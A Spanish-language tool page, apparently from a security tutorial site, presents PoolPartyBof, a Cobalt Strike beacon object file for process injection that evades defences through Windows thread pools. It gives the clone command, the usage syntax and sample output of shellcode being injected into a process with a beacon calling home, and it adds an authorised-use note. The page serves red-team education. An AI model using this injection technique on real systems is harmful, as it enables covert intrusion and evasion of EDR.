---
title: "PoolPartyBof: evasión de defensas: la técnica que rompe la telemetría"
slug: "poolpartybof"
summary: "PoolPartyBof: evasión de defensas, EDR y telemetría de seguridad."
category: "ciberseguridad"
level: "Avanzado"
reading: 7
tags: ["evasión-de-defensas", "red-team", "ciberseguridad"]
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es PoolPartyBof

**PoolPartyBof** es una herramienta de código abierto orientada a operaciones de red team y adversary simulation. La evasión de defensas es una carrera constante: cada técnica busca reducir la telemetría, retrasar la detección o inutilizar controles.

> Descripción oficial: A beacon object file implementation of PoolParty Process Injection Technique by @SafeBreach and @0xDeku, that abuses Windows Thread Pools.

## Para qué sirve

PoolPartyBof se utiliza en la fase de **evasión de defensas**. Su función es automatizar o simplificar una tarea técnica que, hecha a mano, consumiría tiempo y aumentaría el riesgo de errores.

En la práctica, se integra en cadenas de ataque sobre Windows y Active Directory, donde el operador necesita ejecución fiable y controlada.

## Instalación

```bash
git clone https://github.com/0xEr3bus/PoolPartyBof
cd PoolPartyBof
```

> Revisa el README oficial para dependencias específicas, versiones y notas de compilación.

## Uso básico

```bash
PoolPartyBof <Process ID> <Path To Shellcode> <Variant>
```

```bash
 PoolPartyBof 2136 /tmp/beacon_x64.bin 4
[*] Opening 2136 and running PoolParty with /tmp/beacon_x64.bin shellcode!
[+] host called home, sent: 314020 bytes
[+] received output:
[INFO] 	Shellcode Size: 307200 bytes
[+] received output:
[INFO] 	Starting PoolParty attack against process id: 2136
[+] received output:
[INFO]   Retrieved handle to the target process: 0000000000000670
[+] received output:
[INFO] 	Hijacked worker factory handle from the target process: 000000C96E0FF5B8
[+] received output:
[INFO] 	Hijacked timer queue handle from the target process: 000000C96E0FF5B8
[+] received output:
[INFO]   Allocated shellcode memory in the target process: 00000290C91B0000
[+] received output:
[INFO]   Written shellcode to the target process
[+] received output:
[INFO] 	Retrieved target worker factory basic information
[+] received output:
[INFO] 	Created TP_TIMER structure associated with the shellcode
[+] received output:
[INFO] 	Allocated TP_TIMER memory in the target process: 00000290C9200000 
[+] received output:
[INFO] 	Written the specially crafted TP_TIMER structure to the target process
[+] received output:
[INFO] 	Modified the target process's TP_POOL timer queue WindowsStart and Windows End to point to the specially crafted TP_TIMER
[+] received output:
[INFO] 	Set the timer queue to expire to trigger the dequeueing TppTimerQueueExpiration
[+] received output:
[INFO] 	PoolParty attack completed.
```

## Compatibilidad y requisitos

- **Lenguaje principal:** C
- **Última actualización del repositorio:** 2023-12-21
- **Estrellas en GitHub:** 461
- **Termux:** no

**Requiere Windows o un entorno Windows.** Esta herramienta está diseñada para Windows, .NET, Active Directory o Cobalt Strike. No se ejecuta de forma nativa en Termux; úsala en una máquina virtual, un laboratorio aislado o un equipo de pruebas con Windows.

## Ética y alcance

Usa PoolPartyBof únicamente en sistemas propios o con autorización escrita. El uso no autorizado es ilegal. En laboratorio, aísla la red, documenta cada paso y respeta el alcance acordado.

## Referencias

- Repositorio oficial: https://github.com/0xEr3bus/PoolPartyBof
- Toolkit de origen: Red Teaming Toolkit
